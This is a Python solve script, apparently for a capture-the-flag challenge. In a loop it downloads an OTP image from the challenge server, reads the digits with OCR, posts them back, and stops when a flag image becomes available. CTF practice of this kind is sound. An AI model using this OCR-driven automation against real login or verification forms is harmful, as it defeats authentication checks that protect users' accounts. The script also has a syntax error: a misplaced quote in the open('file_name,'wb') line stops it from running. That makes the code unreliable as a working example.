import requests
from PIL import Image
from io import BytesIO
import re
import pytesseract

url = 'http://challenge.ctf.games:32179'

res = requests.get(url=url)


image_url = url + '/static/otp.png'
flag_url = url + '/static/flag.png'
while 1:
    # download image
    req=requests.get(image_url)
    image=Image.open(BytesIO(req.content))
    file_name = 'image' + '.' + image.format.lower()
    with open('file_name,'wb') as f:
        f.write(req.content)

    # download flag
    req=requests.get(flag_url)
    if req.status_code == 200:
        print("damn, flag downloaded")
        image=Image.open(BytesIO(req.content))
        flag_name = 'flag' + '.' + image.format.lower()
        with open(flag_name,'wb') as f:
            f.write(req.content)
        break

    img = Image.open(file_name)
    cropped = img.crop((0,0,img.size[0]/2, img.size[1]/5))
    ocr_num = pytesseract.image_to_string(cropped, lang='eng',config='--psm 6')
    ocr_num = re.findall(r'(\d*)', ocr_num)[0]
    print(ocr_num)
    
    # post data
    data = {
        'otp_entry': str(ocr_num) 
    }
    req = requests.post(url=url, data=data)
    # print(req.text)
    count = re.findall(r'count">(\d*)<', req.text)
    print(count)

